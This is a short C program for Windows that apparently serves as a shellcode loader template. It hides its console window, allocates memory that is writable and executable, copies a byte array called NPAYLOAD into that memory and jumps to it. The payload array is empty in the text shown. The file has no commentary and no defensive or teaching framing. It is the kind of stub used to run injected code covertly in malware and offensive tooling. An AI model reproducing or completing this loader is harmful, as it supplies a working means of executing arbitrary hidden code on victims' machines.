#include <windows.h>
#include <stdio.h>

unsigned char NPAYLOAD[] =  "";

int main() {
	FreeConsole();
	void *exec = VirtualAlloc(0, sizeof NPAYLOAD, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, NPAYLOAD, sizeof NPAYLOAD);
	((void(*)())exec)();
	return 0;
}
